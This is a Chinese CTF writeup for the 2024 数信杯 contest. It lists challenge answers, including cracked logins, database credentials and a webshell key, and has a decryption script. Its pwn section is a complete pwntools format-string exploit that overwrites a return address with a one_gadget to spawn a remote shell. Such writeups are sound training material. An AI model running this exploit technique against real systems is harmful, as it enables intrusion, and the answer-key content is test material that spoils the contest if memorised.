---
title: '2024 数信杯 Writeup'
description: '1.协议 + 用户名 + 密码'
pubDate: 2024-10-20
author: 'IHK-1'
tags: ['CTF', '数信杯', '2024']
---

# 数据分析
## 1.数据分析1
1.协议 + 用户名 + 密码

2.总计传输多少文件

```plain
101 key.txt
```

## 2.数据分析3
1.爆破账号

```plain
admin:dmin@QWEzxc
```

2.thekey

3.数据库账号密码

```plain
报错注入 D124759C42CDF90C
```

```plain
webuser:1q2w3e4r5t6y
```

## 3.数据分析5
1.key

```plain
蚁剑 4825376109164835
```

# 数据安全
## <font style="color:rgb(51, 51, 51);">1.re_ds001</font>
```plain
def dec(data):
    return bytes([((b >> 3) | (b << 5 & 0xff)) for b in data])

with open(r"C:\Users\86158\Desktop\REVERSE\re_ds001\en_file_data.enf", 'rb') as f:
    enc = f.read()
enc = dec(enc)
# for i in range(len(enc)):
#     enc[i] = bytes((enc[i] >> 3) | (enc[i] << 5 & 0xff))
with open(r"C:\Users\86158\Desktop\REVERSE\re_ds001\enc.txt", 'wb') as ff:
    ff.write(enc)
```

## <font style="color:rgb(51, 51, 51);">2.re_ds002</font>
<font style="color:rgb(51, 51, 51);">从这个函数可以看出为rc4加密</font><font style="color:rgb(51, 51, 51);">根据mian函数中内容，在密文后面添加了'\r\n'进行分隔，根据题目要求，只需要第八行数据，所以找到第八个组密文，然后进行动调，将密文输入解密</font><font style="color:rgb(51, 51, 51);">添加一个参数，在进行动调</font><font style="color:rgb(51, 51, 51);">这里下个断点</font><font style="color:rgb(51, 51, 51);">修改ZF，使其能跳到正确路径</font><font style="color:rgb(51, 51, 51);">再下个断点</font><font style="color:rgb(51, 51, 51);">修改Buffer的内存，数据如下</font><font style="color:rgb(51, 51, 51);">继续调试，得到明文</font>
## <font style="color:rgb(51, 51, 51);">3.pb</font>
```plain
from pwn import *
from ctypes import *
from struct import pack
banary = "./pb"
elf = ELF(banary)
libc = ELF("./libc-2.23.so")
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
ip = '47.116.162.255'
port = 32941
local = 0
if local:
    io = process(banary)
else:
    io = remote(ip, port)

context(log_level = 'debug', os = 'linux', arch = 'amd64')
#context(log_level = 'debug', os = 'linux', arch = 'i386')

def dbg():
    gdb.attach(io)
    pause()

s = lambda data : io.send(data)
sl = lambda data : io.sendline(data)
sa = lambda text, data : io.sendafter(text, data)
sla = lambda text, data : io.sendlineafter(text, data)
r = lambda : io.recv()
ru = lambda text : io.recvuntil(text)
uu32 = lambda : u32(io.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))
uu64 = lambda : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
iuu32 = lambda : int(io.recv(10),16)
iuu64 = lambda : int(io.recv(12),16)
uheap = lambda : u64(io.recv(12).ljust(8,b'\x00'))
lg = lambda data : io.success('%s -> 0x%x' % (data, eval(data)))
ia = lambda : io.interactive()

ru("How to do?")
sl(b'%11$p.%27$p')
ru('0x')
libcbase=iuu64()-0x20840
lg("libcbase")
one=[0x45226,0x4527a,0xf03a4,0xf1247]
one_gadget=libcbase+one[0]
system=libcbase+libc.sym['system']
lg("one_gadget")

printf_got=elf.got['printf']

ru('0x')
stack=iuu64()
lg("stack")
num=stack-0x100+7
ret_addr=stack-0xf0

ru("How to do?")
payload='%'+str((num)&0xffff)+'c'+'%27$hn'
sl(payload)

ru("How to do?")
payload='%'+str(0xff)+'c'+'%41$hhn'
sl(payload)

ru("How to do?")
payload='%'+str((ret_addr)&0xff)+'c'+'%27$hhn'
sl(payload)

ru("How to do?")
payload='%'+str(one_gadget&0xff)+'c'+'%41$hhn'
sl(payload)

ru("How to do?")
payload='%'+str((ret_addr+1)&0xff)+'c'+'%27$hhn'
sl(payload)

ru("How to do?")
payload='%'+str((one_gadget>>8)&0xff)+'c'+'%41$hhn'
sl(payload)

ru("How to do?")
payload='%'+str((ret_addr+2)&0xff)+'c'+'%27$hhn'
sl(payload)

ru("How to do?")
payload='%'+str((one_gadget>>8>>8)&0xff)+'c'+'%41$hhn'
sl(payload)

ru("How to do?")
payload='%'+str((ret_addr+3)&0xff)+'c'+'%27$hhn'
sl(payload)

ru("How to do?")
payload='%'+str((one_gadget>>8>>8>>8)&0xff)+'c'+'%41$hhn'
sl(payload)

ru("How to do?")
payload='%'+str((num)&0xff)+'c'+'%27$hhn'
sl(payload)

ru("How to do?")
payload='%'+str(0x0)+'c'+'%41$hhn'
sl(payload)

ia()
```

